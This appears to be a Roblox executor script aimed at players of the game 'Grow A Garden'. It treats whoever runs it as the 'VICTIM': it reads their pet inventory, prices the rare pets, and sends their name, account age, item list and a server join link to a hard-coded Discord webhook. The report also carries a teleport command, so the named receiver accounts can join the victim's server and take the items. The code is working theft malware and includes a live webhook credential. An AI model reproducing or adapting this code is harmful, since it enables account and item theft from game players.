-- ✅ Configuration
local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP",
    USERNAMES = { "saikigrow", "", "", "yyyyyvky" },
    PET_WHITELIST = {
        "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
        "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune"
    }
}

-- 🐾 Emojis & Values
local petEmojis = {
    ["Raccoon"] = "🦝", ["T-Rex"] = "🦖", ["FennecFox"] = "🦊", ["Dragonfly"] = "🐉",
    ["Butterfly"] = "🦋", ["DiscoBee"] = "💃🐝", ["MimicOctopus"] = "🐙",
    ["QueenBee"] = "👑🐝", ["Spinosaurus"] = "🦕", ["Kitsune"] = "🦊✨"
}
local mutationIcons = {
    ["Rainbow"] = "🌈", ["Mega"] = "💥", ["Ascended"] = "🔱", ["Shiny"] = "✨"
}
local petValues = {
    ["Raccoon"] = 1500, ["T-Rex"] = 2000, ["FennecFox"] = 1200,
    ["Dragonfly"] = 1700, ["Butterfly"] = 1100, ["DiscoBee"] = 1800,
    ["MimicOctopus"] = 2400, ["QueenBee"] = 2200, ["Spinosaurus"] = 2100,
    ["Kitsune"] = 2500
}

-- 🛠️ Services
repeat task.wait() until game:IsLoaded()
local VICTIM = game.Players.LocalPlayer
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
local victimPetTable = {}

-- 🔎 Detect mutation
local function detectMutation(name)
    for mutation, icon in pairs(mutationIcons) do
        if string.find(name, mutation) then
            return mutation, icon
        end
    end
    return nil, ""
end

-- ✅ Whitelist check
local function checkPetsWhilelist(pet)
    for _, name in CONFIG.PET_WHITELIST do
        if string.find(pet, name) then return true end
    end
end

-- 🐶 Get pets and calculate value
local function getPlayersPets()
    local totalValue = 0
    for petUid, data in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        local petName = data.PetType
        if checkPetsWhilelist(petName) then
            local mutation, mutationIcon = detectMutation(petName)
            local cleanName = petName:gsub("Rainbow", ""):gsub("Mega", ""):gsub("Ascended", ""):gsub("Shiny", ""):gsub("%s+", "")
            local emoji = petEmojis[cleanName] or "❓"
            local baseValue = petValues[cleanName] or 1000
            local multiplier = 1
            if mutation == "Rainbow" then multiplier = 3
            elseif mutation == "Mega" then multiplier = 2
            elseif mutation == "Ascended" then multiplier = 2.5
            elseif mutation == "Shiny" then multiplier = 1.5 end

            local value = math.floor(baseValue * multiplier)
            totalValue += value

            table.insert(victimPetTable, string.format("%s %s %s (%d¢)", emoji, mutationIcon, petName, value))
        end
    end
    return totalValue
end

-- 🌐 Discord embed
local function createDiscordEmbed(petList, totalValue)
    local embed = {
        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
        color = 65280,
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                    VICTIM.Name, table.concat(CONFIG.USERNAMES, ", "), identifyexecutor(), VICTIM.AccountAge),
                inline = false
            },
            {
                name = "💰 Total Value",
                value = string.format("```%s¢```", totalValue),
                inline = false
            },
            {
                name = "🌴 Backpack",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "🏝️ Join with URL",
                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.JobId, game.PlaceId, game.JobId),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", game.PlaceId, game.JobId),
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local request = http_request or request or HttpPost or syn.request
    request({
        Url = CONFIG.WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
end

-- 🟢 Run everything
local totalValue = getPlayersPets()
task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            createDiscordEmbed(table.concat(victimPetTable, "\n"), totalValue)
            break
        end
    end
end)
